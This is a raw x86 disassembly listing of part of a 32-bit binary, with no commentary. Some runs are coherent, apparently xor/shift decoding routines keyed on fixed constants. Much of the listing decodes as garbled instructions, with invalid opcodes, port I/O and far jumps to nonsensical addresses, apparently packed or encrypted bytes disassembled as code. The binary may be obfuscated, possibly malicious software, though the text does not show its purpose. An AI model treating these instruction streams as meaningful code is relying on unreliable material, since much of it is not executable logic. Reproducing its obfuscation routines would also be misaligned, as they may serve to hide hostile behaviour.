  407e01:	xchg   esi,eax
  407e02:	fiadd  DWORD PTR [esi+0x3c51d5d8]
  407e08:	inc    edi
  407e09:	fild   DWORD PTR [edi-0x74a5fd0f]
  407e0f:	dec    ebp
  407e10:	or     al,0xf
  407e12:	lods   al,BYTE PTR ds:[esi]
  407e13:	enter  0xc102,0xe9
  407e17:	add    cl,BYTE PTR [ebx+0x558b084d]
  407e1d:	or     al,0x33
  407e1f:	mov    ecx,0xd2331ee1
  407e25:	or     eax,edx
  407e27:	add    eax,DWORD PTR ds:0x422758
  407e2d:	mov    DWORD PTR [ebp+0x14],eax
  407e30:	mov    eax,DWORD PTR [ebp+0x8]
  407e33:	mov    ecx,DWORD PTR [ebp+0xc]
  407e36:	shrd   eax,ecx,0x2
  407e3a:	shr    ecx,0x2
  407e3d:	mov    ecx,DWORD PTR [ebp+0x8]
  407e40:	mov    edx,DWORD PTR [ebp+0xc]
  407e43:	xor    eax,edi
  407e45:	shl    ecx,0x1e
  407e48:	xor    edx,edx
  407e4a:	or     eax,edx
  407e4c:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  407e50:	mov    eax,DWORD PTR [ebp+0x14]
  407e53:	xor    BYTE PTR [eax],cl
  407e55:	mov    eax,DWORD PTR [ebp-0x60]
  407e58:	mov    ecx,DWORD PTR [ebp-0x5c]
  407e5b:	shrd   eax,ecx,0x2
  407e5f:	shr    ecx,0x2
  407e62:	mov    ecx,DWORD PTR [ebp-0x60]
  407e65:	mov    edx,DWORD PTR [ebp-0x5c]
  407e68:	xor    eax,edi
  407e6a:	shl    ecx,0x1e
  407e6d:	xor    edx,edx
  407e6f:	or     eax,edx
  407e71:	add    eax,DWORD PTR ds:0x422758
  407e77:	mov    DWORD PTR [ebp+0x14],eax
  407e7a:	mov    eax,DWORD PTR [ebp-0x60]
  407e7d:	mov    ecx,DWORD PTR [ebp-0x5c]
  407e80:	shrd   eax,ecx,0x2
  407e84:	shr    ecx,0x2
  407e87:	mov    ecx,DWORD PTR [ebp-0x60]
  407e8a:	mov    edx,DWORD PTR [ebp-0x5c]
  407e8d:	xor    eax,edi
  407e8f:	shl    ecx,0x1e
  407e92:	xor    edx,edx
  407e94:	or     eax,edx
  407e96:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  407e9a:	mov    eax,DWORD PTR [ebp+0x14]
  407e9d:	or     BYTE PTR [eax],cl
  407e9f:	mov    eax,DWORD PTR [ebp-0x48]
  407ea2:	mov    ecx,DWORD PTR [ebp-0x44]
  407ea5:	shrd   eax,ecx,0x2
  407ea9:	shr    ecx,0x2
  407eac:	mov    ecx,DWORD PTR [ebp-0x48]
  407eaf:	mov    edx,DWORD PTR [ebp-0x44]
  407eb2:	xor    eax,edi
  407eb4:	jmp    0x408255
  407eb9:	out    0x23,al
  407ebb:	pop    ss
  407ebc:	jns    0x407ed9
  407ebe:	jns    0x407e6b
  407ec0:	mov    bl,0xaa
  407ec2:	repz ror edi,0xff
  407ec6:	ins    DWORD PTR es:[edi],dx
  407ec7:	mov    BYTE PTR [esi+edi*4-0x4241419b],ah
  407ece:	les    edi,FWORD PTR [esi-0x1c43f042]
  407ed4:	xchg   ecx,eax
  407ed5:	sub    DWORD PTR ds:0x7e59e45c,0x9cb64f99
  407edf:	fbld   TBYTE PTR ds:0xa2af4f91
  407ee5:	and    DWORD PTR [ebx-0xa],ebx
  407ee8:	jno    0x407ee8
  407eea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407eeb:	nop
  407eec:	xor    BYTE PTR [ebx+edi*2],bl
  407eef:	sub    ebp,DWORD PTR [esp+ebp*4+0x531f3e1]
  407ef6:	pop    esp
  407ef7:	out    0x48,eax
  407ef9:	and    al,0x4
  407efb:	(bad)  
  407efc:	rol    BYTE PTR ds:0xa4368a27,cl
  407f02:	mov    al,ds:0x98a99794
  407f07:	dec    edx
  407f08:	arpl   WORD PTR [edx+ebx*4-0x53],cx
  407f0c:	loope  0x407ee7
  407f0e:	(bad)  
  407f0f:	cdq    
  407f10:	inc    edx
  407f11:	shl    DWORD PTR ds:0x2b591f20,cl
  407f17:	aaa    
  407f18:	inc    edi
  407f19:	in     al,dx
  407f1a:	test   bh,0x13
  407f1d:	lods   al,BYTE PTR ds:[esi]
  407f1e:	(bad)  
  407f1f:	xchg   esp,eax
  407f20:	and    al,BYTE PTR [ecx+0x637ad03a]
  407f26:	adc    edi,DWORD PTR [eax+0x75]
  407f29:	repnz das 
  407f2b:	pop    edx
  407f2c:	jnp    0x407eee
  407f2e:	aam    0xff
  407f30:	jg     0x407f18
  407f32:	arpl   dx,ax
  407f34:	and    al,0x7f
  407f36:	loopne 0x407ecb
  407f38:	sar    DWORD PTR [ecx-0x67],0xe0
  407f3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f3d:	jge    0x407f35
  407f3f:	cmp    ch,BYTE PTR [edi]
  407f41:	stos   DWORD PTR es:[edi],eax
  407f42:	mov    edi,0xaf71ef08
  407f47:	add    bl,ah
  407f49:	lea    bp,[ecx+eax*4-0x5bc1b3ff]
  407f51:	mov    ah,dh
  407f53:	in     al,dx
  407f54:	cmp    esi,edx
  407f56:	or     DWORD PTR [edx],eax
  407f58:	add    ecx,DWORD PTR [esi+0x15]
  407f5b:	adc    BYTE PTR [edi],ah
  407f5d:	inc    ebx
  407f5e:	jmp    0x9f72:0xf25a7bef
  407f65:	dec    ebx
  407f66:	int3   
  407f67:	dec    esp
  407f68:	mov    es,WORD PTR [ebx-0x7f7a3a]
  407f6e:	repz mov cl,0xf3
  407f71:	sbb    eax,0xc9501fe6
  407f76:	mov    bl,0x77
  407f78:	jo     0x407f17
  407f7a:	retf   0x16b5
  407f7d:	ret    0x197b
  407f80:	in     al,dx
  407f81:	fst    st(4)
  407f83:	pop    ebp
  407f84:	or     al,0xc4
  407f86:	sbb    ah,dl
  407f88:	and    DWORD PTR [ecx+0x18e5b11e],ebx
  407f8e:	aad    0x89
  407f90:	mov    edx,0xed6ce984
  407f95:	mov    esi,DWORD PTR cs:[ecx+ecx*8]
  407f99:	rol    BYTE PTR [ecx+eiz*8],cl
  407f9c:	xchg   edi,eax
  407f9d:	rcl    DWORD PTR [esi+edx*2-0x9cf4f41],1
  407fa4:	aam    0xa7
  407fa6:	(bad)  
  407fa8:	out    dx,al
  407fa9:	fnstenv [ebp-0x64]
  407fac:	mov    fs,edx
  407fae:	adc    DWORD PTR [edx+0x4edf9ecd],ecx
  407fb4:	push   ss
  407fb5:	aaa    
  407fb6:	fadd   DWORD PTR [ebp+0x417b32da]
  407fbc:	jg     0x407fa1
  407fbe:	shr    DWORD PTR [edx+edx*2+0x6f],1
  407fc2:	jl     0x407ffe
  407fc4:	sar    dh,1
  407fc6:	mov    gs,WORD PTR [ebx]
  407fc8:	cmp    al,0xde
  407fca:	sbb    al,0x4a
  407fcc:	cld    
  407fcd:	aad    0x6c
  407fcf:	mov    ebx,0xc2032f46
  407fd4:	js     0x407fff
  407fd6:	mov    al,ds:0x5befca6a
  407fdb:	pop    ecx
  407fdc:	jge    0x407ff2
  407fde:	mov    BYTE PTR [eax+ecx*2+0x3c7463f5],dl
  407fe5:	xchg   esp,eax
  407fe6:	cs fsubrp st(1),st
  407fe9:	arpl   WORD PTR [edx+0x56ccd7da],bx
  407fef:	pop    ss
  407ff0:	inc    esp
  407ff1:	add    ch,ch
  407ff3:	xchg   edx,eax
  407ff4:	scas   al,BYTE PTR es:[edi]
  407ff5:	xor    ecx,esi
  407ff7:	popa   
  407ff8:	mov    ebp,0xc4e3b562
  407ffd:	jmp    0x407f9f
  407fff:	sbb    ah,BYTE PTR [edx-0x56696267]
  408005:	or     ebx,DWORD PTR [edx]
  408007:	test   DWORD PTR [edx+eax*2+0x3fbb0b7d],esp
  40800e:	ret    
  40800f:	retf   0x8026
  408012:	mov    ebp,DWORD PTR [esi+0x234a60b6]
  408018:	and    eax,0x61eaaa2a
  40801d:	xchg   ecx,eax
  40801e:	xor    DWORD PTR [edi+0x5f0038a5],0xffffff82
  408025:	pop    edi
  408026:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408027:	mov    edx,0x1e17d309
  40802c:	out    0x96,al
  40802e:	lods   al,BYTE PTR ds:[esi]
  40802f:	xlat   BYTE PTR ds:[ebx]
  408030:	cdq    
  408031:	mov    DWORD PTR [ecx-0x5cd5aee],esi
  408037:	dec    ebp
  408038:	and    dh,BYTE PTR [eax+0x73b6a52f]
  40803e:	xchg   ecx,eax
  40803f:	push   0xffffffbe
  408041:	mov    DWORD PTR [esi+ebp*4-0x65e2c66b],esp
  408048:	loop   0x40807c
  40804a:	popa   
  40804b:	fsub   DWORD PTR [eax+0x2bda277]
  408051:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408052:	jns    0x4080c8
  408054:	stos   BYTE PTR es:[edi],al
  408055:	dec    edi
  408056:	mov    edi,0xabae475c
  40805b:	push   ss
  40805c:	mov    ebp,0x4b4a4a23
  408061:	test   al,0x5a
  408063:	jge    0x408052
  408065:	inc    edx
  408066:	lahf   
  408067:	retf   
  408068:	push   edx
  408069:	stc    
  40806a:	sbb    dh,BYTE PTR [ecx+0x7aa73334]
  408070:	cmp    ah,BYTE PTR [ebp-0x29]
  408073:	jno    0x408041
  408075:	jl     0x4080ee
  408077:	in     eax,0x19
  408079:	push   edx
  40807a:	push   esp
  40807b:	loop   0x408052
  40807d:	stc    
  40807e:	cmp    BYTE PTR [ebp+0x6c8bf1cc],bl
  408084:	(bad)  
  408085:	in     al,dx
  408086:	or     al,0x4e
  408088:	aas    
  408089:	or     eax,0x371c8417
  40808e:	adc    al,0x9d
  408090:	cwde   
  408091:	stc    
  408092:	dec    edx
  408093:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408094:	sbb    eax,0x43eccb90
  408099:	in     al,dx
  40809a:	retf   
  40809b:	test   esp,ebp
  40809d:	pop    ds
  40809e:	repz sbb ch,BYTE PTR [ebx+0x920a6a3]
  4080a5:	jmp    0x1c48e5bf
  4080aa:	out    0x88,eax
  4080ac:	add    bh,BYTE PTR [edi+0x6ecf2102]
  4080b2:	push   es
  4080b3:	sahf   
  4080b4:	lods   al,BYTE PTR ds:[esi]
  4080b5:	dec    esi
  4080b6:	mov    ebp,0xb475d2be
  4080bb:	jge    0x408043
  4080bd:	in     eax,dx
  4080be:	out    0xc8,eax
  4080c0:	mov    dl,0x4d
  4080c2:	jle    0x4080a2
  4080c4:	icebp  
  4080c5:	scas   eax,DWORD PTR es:[edi]
  4080c6:	shl    DWORD PTR [ebx+0x16650f22],0x39
  4080cd:	mov    ebp,0x42c9788b
  4080d2:	fld    TBYTE PTR [ecx+0x797c08d6]
  4080d8:	jl     0x408134
  4080da:	gs je  0x408139
  4080dd:	scas   al,BYTE PTR es:[edi]
  4080de:	cwde   
  4080df:	mov    bl,0x84
  4080e1:	ds (bad) 
  4080e3:	pop    ecx
  4080e4:	mov    ds:0xa9e0b3ca,eax
  4080e9:	(bad)  
  4080ea:	adc    al,0x62
  4080ec:	sbb    edi,DWORD PTR [eax]
  4080ee:	xchg   edi,eax
  4080ef:	pop    edx
  4080f0:	test   DWORD PTR [ebp+0x76d6cfdc],ecx
  4080f6:	call   0xa521:0x4b4cbc37
  4080fd:	in     eax,dx
  4080fe:	mov    ebp,0x8dac864b
  408103:	push   0xffffff82
  408105:	push   ds
  408106:	mov    esp,0x95833f4a
  40810b:	imul   ebx,DWORD PTR [esi-0x3619153a],0x20
  408112:	add    ecx,0xffffffcc
  408115:	dec    ebx
  408116:	dec    esp
  408117:	mov    bl,0xff
  408119:	rcl    DWORD PTR [edx],1
  40811b:	cmp    DWORD PTR [eax+0x1a],edx
  40811e:	es dec eax
  408120:	fld    QWORD PTR [esi+0x6a]
  408123:	loopne 0x40811f
  408125:	f2xm1  
  408127:	std    
  408128:	enter  0x20ea,0x47
  40812c:	jl     0x40814d
  40812e:	rcr    BYTE PTR [edi-0xa713b22],0xee
  408135:	lock dec ebx
  408137:	sbb    BYTE PTR [edx-0x3a],0x67
  40813b:	inc    ebx
  40813c:	sub    al,0x9f
  40813e:	xchg   ebp,eax
  40813f:	dec    esp
  408140:	sbb    DWORD PTR [ebx+0x35],esi
  408143:	and    BYTE PTR [esi+0x13],bh
  408146:	mov    ecx,0xe09a37b
  40814b:	jmp    0x1927:0xdc5b0253
  408152:	cmp    ah,BYTE PTR [edx+ebp*1+0x2b]
  408156:	loope  0x4080df
  408158:	fcmovne st,st(2)
  40815a:	mov    ecx,0x6831814d
  40815f:	shr    DWORD PTR [ebx+0x6000be1d],0x91
  408166:	shr    BYTE PTR [esi+eiz*1-0x2c],cl
  40816a:	jbe    0x40814c
  40816c:	fst    st(6)
  40816e:	loop   0x4081c8
  408170:	shl    DWORD PTR [edi-0x604b13af],cl
  408176:	cli    
  408177:	push   ebx
  408178:	repz sbb al,0x80
  40817b:	mov    edx,0xab9d5dbf
  408180:	rcr    DWORD PTR [edi+esi*1-0x58],1
  408184:	lock push edx
  408186:	daa    
  408187:	mov    DWORD PTR [ebx-0x47],ebp
  40818a:	pop    ebx
  40818b:	xchg   bl,bl
  40818d:	loopne 0x40815a
  40818f:	icebp  
  408190:	or     ch,cl
  408192:	out    0xb1,al
  408194:	call   0x8555:0x2bb5fb3e
  40819b:	mov    eax,esp
  40819d:	inc    esi
  40819e:	adc    BYTE PTR [ecx+0x77c40743],0x31
  4081a5:	jmp    0x6b6a:0x140b54ef
  4081ac:	mov    esi,ebp
  4081ae:	loopne 0x408207
  4081b0:	mov    eax,ds:0xc94f4665
  4081b5:	sub    eax,0x23cec0c4
  4081ba:	popa   
  4081bb:	add    cl,BYTE PTR [eax-0x76]
  4081be:	div    dh
  4081c0:	and    BYTE PTR [esi+edx*1+0x88d691a],0x83
  4081c8:	sub    bl,ch
  4081ca:	xchg   ebx,eax
  4081cb:	sub    DWORD PTR [esi-0x1],ecx
  4081ce:	shl    DWORD PTR [ebx-0x1d6d7873],1
  4081d4:	mov    esp,0xee71d71a
  4081d9:	test   BYTE PTR [ebp+0x19720b],bh
  4081df:	in     eax,dx
  4081e0:	push   edx
  4081e1:	and    DWORD PTR [eax+0x18f952c4],esi
  4081e7:	xlat   BYTE PTR ds:[ebx]
  4081e8:	int    0x4b
  4081ea:	mov    eax,ds:0x568ec354
  4081ef:	iret   
  4081f0:	sub    al,0xfa
  4081f2:	mov    dh,0xce
  4081f4:	mov    esi,0x105f9544
  4081f9:	in     eax,0xb7
  4081fb:	stos   BYTE PTR es:[edi],al
  4081fc:	add    al,0x13
  4081fe:	mov    dl,0x3f
  408200:	sub    DWORD PTR [ebx],edi
  408202:	mul    ecx
  408204:	inc    edx
  408205:	lea    ebx,[ebx-0x75]
  408208:	xor    al,0xdd
  40820a:	jecxz  0x40819b
  40820c:	das    
  40820d:	test   BYTE PTR [edi],al
  40820f:	imul   edx,DWORD PTR [eax+ebx*8],0x6a
  408213:	pop    edx
  408214:	push   0xbc064e0
  408219:	xchg   esp,eax
  40821a:	clc    
  40821b:	sub    eax,0xb6fc94f3
  408220:	push   cs
  408221:	lods   al,BYTE PTR ds:[esi]
  408222:	test   DWORD PTR [edx-0x5d],esi
  408225:	ins    BYTE PTR es:[edi],dx
  408226:	cwde   
  408227:	in     al,0xeb
  408229:	push   ss
  40822a:	push   0x46947e3b
  40822f:	sub    DWORD PTR [ecx],eax
  408231:	cmp    BYTE PTR [ecx-0x573ee58e],al
  408237:	rcr    cl,1
  408239:	sbb    DWORD PTR [ebp-0x2925efd0],0x2a
  408240:	add    ebp,0x294cd1af
  408246:	jae    0x40827f
  408248:	dec    edi
  408249:	mov    bh,0xf8
  40824b:	push   esi
  40824c:	inc    eax
  40824d:	or     BYTE PTR [ebx],ch
  40824f:	sbb    eax,0x2e0b72f3
  408254:	test   al,0x33
  408256:	ror    BYTE PTR [ebx],cl
  408258:	ret    0x503
  40825b:	pop    eax
  40825c:	daa    
  40825d:	inc    edx
  40825e:	add    cl,al
  408260:	loope  0x408280
  408262:	mov    DWORD PTR [ebp+0x14],eax
  408265:	mov    eax,DWORD PTR [ebp-0x48]
  408268:	mov    ecx,DWORD PTR [ebp-0x44]
  40826b:	shrd   eax,ecx,0x2
  40826f:	shr    ecx,0x2
  408272:	mov    ecx,DWORD PTR [ebp-0x48]
  408275:	mov    edx,DWORD PTR [ebp-0x44]
  408278:	xor    eax,edi
  40827a:	shl    ecx,0x1e
  40827d:	xor    edx,edx
  40827f:	or     eax,edx
  408281:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  408285:	mov    eax,DWORD PTR [ebp+0x14]
  408288:	add    BYTE PTR [eax],cl
  40828a:	mov    eax,DWORD PTR [ebp-0x38]
  40828d:	mov    ecx,DWORD PTR [ebp-0x34]
  408290:	shrd   eax,ecx,0x2
  408294:	xor    eax,edi
  408296:	shr    ecx,0x2
  408299:	mov    ecx,DWORD PTR [ebp-0x38]
  40829c:	mov    edx,DWORD PTR [ebp-0x34]
  40829f:	shl    ecx,0x1e
  4082a2:	mov    ecx,DWORD PTR [ebp-0x38]
  4082a5:	xor    edx,edx
  4082a7:	or     eax,edx
  4082a9:	mov    edx,DWORD PTR [ebp-0x34]
  4082ac:	add    eax,DWORD PTR ds:0x422758
  4082b2:	shrd   ecx,edx,0x2
  4082b6:	xor    ecx,edi
  4082b8:	shr    edx,0x2
  4082bb:	mov    edx,DWORD PTR [ebp-0x38]
  4082be:	mov    edi,DWORD PTR [ebp-0x34]
  4082c1:	xor    edi,edi
  4082c3:	or     ecx,edi
  4082c5:	mov    cl,BYTE PTR [ebp+ecx*1-0x4]
  4082c9:	or     BYTE PTR [eax],cl
  4082cb:	mov    eax,DWORD PTR [esi]
  4082cd:	mov    ecx,DWORD PTR [esi+0x4]
  4082d0:	shl    eax,0x1e
  4082d3:	shl    edx,0x1e
  4082d6:	mov    edx,DWORD PTR [esi]
  4082d8:	mov    edi,DWORD PTR [esi+0x4]
  4082db:	xor    edi,0x9c2b8ae8
  4082e1:	xor    eax,0x80000000
  4082e6:	mov    DWORD PTR [ebp+0x14],eax
  4082e9:	mov    eax,0xcb79b577
  4082ee:	xor    edx,eax
  4082f0:	shrd   edx,edi,0x2
  4082f4:	shr    edi,0x2
  4082f7:	or     edi,DWORD PTR [ebp+0x14]
  4082fa:	xor    ecx,ecx
  4082fc:	or     edx,ecx
  4082fe:	mov    ecx,DWORD PTR [ebx]
  408300:	mov    DWORD PTR [ebp-0x64],edi
  408303:	mov    edi,DWORD PTR [ebx+0x4]
  408306:	mov    edi,ecx
  408308:	xor    ecx,ecx
  40830a:	shl    edi,0x1e
  40830d:	xor    edi,0x80000000
  408313:	mov    DWORD PTR [ebp+0x10],ecx
  408316:	mov    ecx,DWORD PTR [ebx]
  408318:	mov    DWORD PTR [ebp+0x14],edi
  40831b:	mov    edi,DWORD PTR [ebx+0x4]
  40831e:	xor    ecx,eax
  408320:	xor    edi,0x9c2b8ae8
  408326:	shrd   ecx,edi,0x2
  40832a:	or     ecx,DWORD PTR [ebp+0x10]
  40832d:	shr    edi,0x2
  408330:	mov    DWORD PTR [ebp-0x70],ecx
  408333:	mov    ecx,edi
  408335:	or     ecx,DWORD PTR [ebp+0x14]
  408338:	mov    DWORD PTR [ebp+0xc],edi
  40833b:	cmp    edx,DWORD PTR [ebp-0x70]
  40833e:	jne    0x408bb3
  408344:	cmp    DWORD PTR [ebp-0x64],ecx
  408347:	jne    0x408bb3
  40834d:	jmp    0x4083eb
  408352:	mov    eax,DWORD PTR [esi]
  408354:	mov    edx,DWORD PTR [esi+0x4]
  408357:	mov    eax,DWORD PTR [esi]
  408359:	mov    edx,DWORD PTR [esi+0x4]
  40835c:	mov    edx,eax
  40835e:	xor    eax,eax
  408360:	shl    edx,0x1e
  408363:	mov    DWORD PTR [ebp+0x10],eax
  408366:	mov    eax,DWORD PTR [esi]
  408368:	xor    edx,0x80000000
  40836e:	mov    DWORD PTR [ebp+0x14],edx
  408371:	mov    edx,DWORD PTR [esi+0x4]
  408374:	xor    eax,0xcb79b577
  408379:	xor    ecx,edx
  40837b:	shrd   eax,ecx,0x2
  40837f:	or     eax,DWORD PTR [ebp+0x10]
  408382:	shr    ecx,0x2
  408385:	mov    DWORD PTR [ebp+0x8],eax
  408388:	mov    eax,ecx
  40838a:	or     eax,DWORD PTR [ebp+0x14]
  40838d:	mov    ecx,DWORD PTR [ebx]
  40838f:	mov    edx,DWORD PTR [ebx+0x4]
  408392:	push   eax
  408393:	push   DWORD PTR [ebp+0x8]
  408396:	push   edx
  408397:	push   ecx
  408398:	call   0x41594e
  40839d:	mov    eax,DWORD PTR [esi]
  40839f:	mov    ecx,DWORD PTR [esi+0x4]
  4083a2:	shrd   eax,ecx,0x2
  4083a6:	shr    ecx,0x2
  4083a9:	shr    edx,0x1e
  4083ac:	xor    ecx,0xe70ae2ba
  4083b2:	push   ecx
  4083b3:	xor    eax,edi
  4083b5:	mov    DWORD PTR [ebp+0x10],edx
  4083b8:	mov    edx,DWORD PTR [ebx]
  4083ba:	mov    edi,DWORD PTR [ebx+0x4]
  4083bd:	push   eax
  4083be:	push   edi
  4083bf:	push   edx
  4083c0:	call   0x41594e
  4083c5:	shld   edx,eax,0x2
  4083c9:	shl    eax,0x2
  4083cc:	mov    ecx,eax
  4083ce:	or     ecx,DWORD PTR [ebp+0x10]
  4083d1:	xor    eax,eax
  4083d3:	or     edx,eax
  4083d5:	xor    ecx,0xcb79b576
  4083db:	xor    edx,0x9c2b8ae8
  4083e1:	mov    DWORD PTR [esi],ecx
  4083e3:	mov    DWORD PTR [esi+0x4],edx
  4083e6:	mov    eax,0xcb79b577
  4083eb:	mov    ecx,DWORD PTR [esi]
  4083ed:	mov    edx,DWORD PTR [esi+0x4]
  4083f0:	mov    edx,ecx
  4083f2:	shl    edx,0x1e
  4083f5:	xor    edx,0x80000000
  4083fb:	mov    DWORD PTR [ebp+0x14],edx
  4083fe:	mov    edx,DWORD PTR [esi]
  408400:	mov    edi,DWORD PTR [esi+0x4]
  408403:	xor    edi,0x9c2b8ae8
  408409:	xor    edx,eax
  40840b:	shrd   edx,edi,0x2
  40840f:	shr    edi,0x2
  408412:	or     edi,DWORD PTR [ebp+0x14]
  408415:	xor    ecx,ecx
  408417:	or     edx,ecx
  408419:	mov    ecx,DWORD PTR [ebx]
  40841b:	mov    DWORD PTR [ebp+0xc],edi
  40841e:	mov    edi,DWORD PTR [ebx+0x4]
  408421:	mov    edi,ecx
  408423:	xor    ecx,ecx
  408425:	shl    edi,0x1e
  408428:	mov    DWORD PTR [ebp+0x10],ecx
  40842b:	mov    ecx,DWORD PTR [ebx]
  40842d:	xor    edi,0x80000000
  408433:	mov    DWORD PTR [ebp+0x14],edi
  408436:	mov    edi,DWORD PTR [ebx+0x4]
  408439:	xor    eax,ecx
  40843b:	jmp    0x4087dc
  408440:	xor    eax,0x7b36559b
  408445:	cmp    al,0xb6
  408447:	pushf  
  408448:	pop    eax
  408449:	out    dx,eax
  40844a:	push   0xffffffd1
  40844c:	mov    dh,0x95
  40844e:	cwde   
  40844f:	jecxz  0x40840e
  408451:	imul   edi,DWORD PTR [esi-0x413b4242],0xffffffbe
  408458:	jne    0x40846f
  40845a:	and    al,0x92
  40845c:	(bad)  
  40845d:	fwait
  40845e:	push   ecx
  40845f:	stos   BYTE PTR es:[edi],al
  408460:	mov    bl,0x73
  408462:	ret    
  408463:	jmp    0xa28e45c
  408468:	test   al,0x63
  40846a:	das    
  40846b:	mov    ebp,0xef2084b7
  408470:	repz jns 0x40843c
  408473:	pop    es
  408474:	or     BYTE PTR [eax+eax*8+0x481ee86a],0xbd
  40847c:	push   0xffffffa5
  40847e:	call   0xe6f2:0x9ad00688
  408485:	jae    0x40847f
  408487:	jbe    0x408421
  408489:	xor    DWORD PTR [edi],edx
  40848b:	and    edi,DWORD PTR ds:0x31fd1154
  408491:	ret    0x22f7
  408494:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408495:	daa    
  408496:	cli    
  408497:	loop   0x408452
  408499:	mov    ch,0x5d
  40849b:	(bad)  
  40849d:	vpminub xmm5,xmm3,xmm2
  4084a1:	fist   DWORD PTR [eax-0x61]
  4084a4:	mov    eax,0xbaeaddc3
  4084a9:	xor    ecx,DWORD PTR [ebx+0x2d7ff3f7]
  4084af:	arpl   sp,dx
  4084b1:	test   DWORD PTR [edi+ecx*8+0x61],esp
  4084b5:	jmp    DWORD PTR [ecx]
  4084b7:	lds    esp,FWORD PTR [edi+0x26]
  4084ba:	outs   dx,BYTE PTR ds:[esi]
  4084bb:	fidiv  WORD PTR [edx]
  4084bd:	popa   
  4084be:	arpl   WORD PTR [edx-0x27],bp
  4084c1:	cli    
  4084c2:	jb     0x4084da
  4084c4:	add    esp,esp
  4084c6:	sbb    DWORD PTR [edx+0xc],ebp
  4084c9:	test   al,0x97
  4084cb:	mov    ch,0xb6
  4084cd:	mov    dh,0xa0
  4084cf:	jne    0x40845e
  4084d1:	push   esp
  4084d2:	xor    al,0x89
  4084d4:	push   edi
  4084d5:	cmp    eax,0x69859e37
  4084da:	aaa    
  4084db:	jnp    0x408511
  4084dd:	mov    ch,ch
  4084df:	je     0x40854c
  4084e1:	std    
  4084e2:	call   0x2def3ef9
  4084e7:	in     eax,0x9c
  4084e9:	and    DWORD PTR [ebx+ebp*4-0x2a868416],esi
  4084f0:	(bad)  
  4084f1:	es pop ss
  4084f3:	pushf  
  4084f4:	jne    0x4084ed
  4084f6:	repz sti 
  4084f8:	xchg   BYTE PTR es:[ecx],dh
  4084fb:	mov    ds:0x3a4d94e,eax
  408500:	and    al,0x75
  408502:	push   ss
  408503:	out    dx,al
  408504:	add    al,0x52
  408506:	ret    
  408507:	arpl   WORD PTR [edx-0x20],bp
  40850a:	(bad)  
  40850b:	test   al,0x5c
  40850d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40850e:	lds    ecx,FWORD PTR [eax+0x3cbe3426]
  408514:	inc    esp
  408515:	in     al,dx
  408516:	cmp    BYTE PTR [ecx],dh
  408518:	xchg   esp,eax
  408519:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40851a:	sar    BYTE PTR [ebx-0x880d641],1
  408520:	jp     0x408558
  408522:	icebp  
  408523:	in     al,dx
  408524:	xchg   edx,eax
  408525:	sbb    BYTE PTR [edi+0x54e2dd5d],cl
  40852b:	pop    ss
  40852c:	sub    DWORD PTR [edx-0x7a66d20d],eax
  408532:	fisttp DWORD PTR [ecx-0x6e]
  408535:	in     al,dx
  408536:	rcl    DWORD PTR [ebx],cl
  408538:	test   BYTE PTR [ecx+0x4d],0x9b
  40853c:	scas   al,BYTE PTR es:[edi]
  40853d:	hlt    
  40853e:	push   ss
  40853f:	lods   eax,DWORD PTR ds:[esi]
  408540:	jo     0x40858c
  408542:	inc    ecx
  408543:	sbb    ebp,DWORD PTR [ecx+0x23520515]
  408549:	inc    edi
  40854a:	and    DWORD PTR [ebx-0x40],0xa2c3bd8
  408551:	retf   
  408552:	popf   
  408553:	xchg   edi,eax
  408554:	push   ds
  408555:	mov    esi,0x7a189bb2
  40855a:	push   es
  40855b:	mov    ds:0xbfc93e72,eax
  408560:	addr16 jno 0x408546
  408563:	je     0x408541
  408565:	xchg   edi,edx
  408567:	mov    bh,0x28
  408569:	sub    BYTE PTR [edx+0x35bc21d9],bh
  40856f:	jmp    0x4084f1
  408571:	sub    al,ah
  408573:	pushf  
  408574:	jge    0x40856a
  408576:	out    0xbf,al
  408578:	or     eax,0xa7cab48
  40857d:	ret    0xe993
  408580:	dec    edx
  408581:	lods   al,BYTE PTR ds:[esi]
  408582:	js     0x40851c
  408584:	int3   
  408585:	fcomp  DWORD PTR [edi+0x67797434]
  40858b:	inc    edx
  40858c:	mov    ebp,DWORD PTR [ebp+0x2e5095d0]
  408592:	mov    DWORD PTR [edx],eax
  408594:	sub    eax,0x9d6e5766
  408599:	pop    esi
  40859a:	(bad)  
  40859b:	fwait
  40859c:	xchg   esp,eax
  40859d:	mov    eax,0xda084cd4
  4085a2:	mov    dh,0xc3
  4085a4:	xor    ebx,DWORD PTR [edx]
  4085a6:	pusha  
  4085a7:	mov    ch,0xe3
  4085a9:	pop    ss
  4085aa:	jb     0x40858c
  4085ac:	mov    gs,WORD PTR [edi-0x17e27fbc]
  4085b2:	in     eax,0x87
  4085b4:	pop    esp
  4085b5:	inc    ecx
  4085b6:	test   al,0x8e
  4085b8:	xchg   edi,eax
  4085b9:	std    
  4085ba:	sbb    cl,bl
  4085bc:	mov    ecx,0x84224b6d
  4085c1:	pop    ecx
  4085c2:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4085c4:	xchg   ebx,eax
  4085c5:	mov    eax,ds:0xd7f3b0ba
  4085ca:	int    0xc4
  4085cc:	pusha  
  4085cd:	xor    cl,dh
  4085cf:	out    0x7d,al
  4085d1:	(bad)  
  4085d2:	inc    edx
  4085d3:	jns    0x4085ea
  4085d5:	mov    ch,0xde
  4085d7:	aad    0xa9
  4085d9:	je     0x4085a7
  4085db:	jge    0x4085bd
  4085dd:	stc    
  4085de:	sbb    BYTE PTR [esi+0x14e17b82],bl
  4085e4:	std    
  4085e5:	xchg   esp,eax
  4085e6:	xchg   ecx,eax
  4085e7:	stos   DWORD PTR es:[edi],eax
  4085e8:	jae    0x408579
  4085ea:	scas   eax,DWORD PTR es:[edi]
  4085eb:	and    DWORD PTR [edx+eiz*1+0x617ce056],0x1478031e
  4085f6:	mov    cl,0xee
  4085f8:	jl     0x408640
  4085fa:	sub    ah,BYTE PTR [ebx+0x17fa7544]
  408600:	or     BYTE PTR [edx+eiz*1],ch
  408603:	mov    BYTE PTR [ebp+0x334cf941],dh
